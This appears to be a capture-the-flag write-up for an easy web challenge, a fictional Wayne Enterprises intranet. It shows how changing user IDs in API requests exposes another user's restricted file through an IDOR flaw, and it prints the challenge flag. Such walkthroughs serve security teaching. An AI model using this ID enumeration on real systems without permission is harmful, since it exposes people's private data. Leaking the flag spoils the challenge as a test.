Here's the Markdown version, cleaned up and formatted for clarity:

```markdown
# ?? Wayne Enterprises Data Leak

> *"Even the world's greatest detective can't fix broken access control."*

Wayne Enterprises has rolled out a brand-new **employee intranet portal**.  
While the UI looks secure, something feels� off.

Your mission is to investigate the portal and determine whether **sensitive files are accessible without proper authorization.**

---

# ?? Challenge Information

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Flag Format** | `DAKSHH{...}` |
| **Flag** | `DAKSHH{batman_needs_access_control}` |

---

## CTFd Room Description
> "Even the world's greatest detective can't fix broken access control."
> 
> Wayne Enterprises just rolled out a sleek, high-end corporate intranet for its employees. It looks incredibly secure on the surface, but Gotham's underground whispers that their API was rushed to production. 
> 
> We've secured basic IT Support credentials (`Employee ID: 1042`, `Password: password`). Log into the portal and manipulate the API to escalate your visibility. Rumor has it that Bruce Wayne (Employee #7) is hiding a highly restricted project file. Find it.

---

# ?? Initial Analysis

Visiting the portal presents a **login screen**.

The login form asks for:
- Employee ID
- Access Code

However, examining the frontend JavaScript (`app.js`) reveals something suspicious.

The login process does **not verify the password**. Instead, it directly calls the API:

```javascript
fetch(`/api/v1/user?id=${empId}`)
```

This means authentication is effectively based only on the employee ID.

## ?? Understanding the API

By observing the network requests made by the dashboard, we discover several API endpoints:

### User Profile API
```
GET /api/v1/user?id=1042
```

**Example response:**
```json
{
  "success": true,
  "data": {
    "name": "John Doe",
    "dept": "IT Support"
  }
}
```

### Documents API
```
GET /api/v1/documents?user_id=1042
```

**Example response:**
```json
{
  "success": true,
  "data": [
    {
      "name": "1042-report.txt",
      "filename": "1042-report.txt",
      "restricted": false
    }
  ]
}
```

### Download API
```
GET /api/v1/download?file=1042-report.txt
```

Allows downloading files stored on the server.

---

# ?? Identifying the Vulnerability

The backend code does not verify whether the requesting user is authorized to access the requested data.

This leads to an **Insecure Direct Object Reference (IDOR)** vulnerability.

**Affected endpoints:**
- `/api/v1/user?id=`
- `/api/v1/documents?user_id=`
- `/api/v1/download?file=`

Because the application trusts user-supplied parameters, we can change the IDs to access other users' data.

---

# ?? Exploitation Steps

## 1?? Log in to the Portal
Use the provided IT Support credentials:
- **Employee ID:** `1042`
- **Password:** `password`

After logging in, the dashboard loads.

## 2?? Inspect Network Requests
Open Developer Tools ? Network tab.

You will see API calls such as:
```
GET /api/v1/user?id=1042
GET /api/v1/documents?user_id=1042
```

## 3?? Enumerate Other Users
Try changing the user ID:
```
GET /api/v1/user?id=7
```

**Response:**
```json
{
  "success": true,
  "data": {
    "name": "Bruce Wayne",
    "dept": "Executive"
  }
}
```

Employee ID `7` belongs to **Bruce Wayne**.

## 4?? Retrieve Bruce Wayne's Documents
```
GET /api/v1/documents?user_id=7
```

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "name": "7-secret.txt",
      "filename": "7-secret.txt",
      "restricted": true
    }
  ]
}
```

## 5?? Download the Restricted File
```
GET /api/v1/download?file=7-secret.txt
```

The server returns the file.

## 6?? Retrieve the Flag
Opening the downloaded file reveals:
```
DAKSHH{batman_needs_access_control}
```

---

# ?? Final Flag
```
DAKSHH{batman_needs_access_control}
```
```

